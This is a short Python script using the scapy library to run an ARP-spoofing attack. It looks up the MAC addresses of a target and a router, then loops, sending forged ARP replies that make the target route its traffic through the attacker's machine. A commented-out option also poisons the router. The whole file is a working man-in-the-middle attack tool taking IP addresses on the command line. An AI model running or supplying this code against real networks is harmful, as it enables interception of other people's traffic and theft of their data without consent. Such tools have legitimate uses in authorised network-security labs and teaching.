# Please note, I have commented out the arp spoofing for router by default, you can change it if you want to spoof router.

import scapy.all as scapy
import sys
import time

# answer = 0

def get_mac(ip_address):
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_packet = scapy.ARP(pdst=ip_address)
    get_mac_address = broadcast/arp_packet
    # global answer
    answer = scapy.srp(get_mac_address, timeout=2, verbose=False)[0]
    return answer[0][1].hwsrc
    # print(answer[0][1].hwsrc)

def spoof(router_ip, router_mac, target_ip, target_mac):
    # mal_packet_for_router = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip) # Packet of ARP for spoofing router.
    mal_packet_for_target = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)
    # scapy.send(mal_packet_for_router)             # Spoofing Router
    scapy.send(mal_packet_for_target)

# target_ip = str(input('Enter Target\'s IP Address: '))
# router_ip = str(input('Enter Router\'s IP Address: '))

target_ip = str(sys.argv[2])
router_ip = str(sys.argv[1])
# print('\n')

target_mac = str(get_mac(target_ip))
router_mac = str(get_mac(router_ip))

# print(target_mac)
# print(router_mac)

try:
    while True:
        spoof(router_ip, router_mac, target_ip, target_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print("Closing ARP Spoofing.")
    exit(0)